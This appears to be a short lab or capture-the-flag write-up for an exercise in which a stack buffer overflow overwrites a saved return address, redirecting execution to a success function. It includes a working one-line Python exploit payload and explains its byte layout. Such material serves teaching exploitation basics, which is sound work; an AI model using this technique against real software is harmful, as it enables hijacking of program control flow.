# ex03 - Return address overwrite

## Goal
Print `code flow successfully changed`.

## Relevant idea
The program reads input into a fixed-size stack buffer and then returns. Enough input overwrites the saved return address on the stack.

## Exploit
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x24\x84\x04\x08")' | ./bin
```

## Why it works
64 `A` bytes fill the buffer, and the next 4 bytes overwrite the saved EIP with `0x08048424`, the address of the success function. When `main` executes `ret`, it jumps there instead of back to the caller.

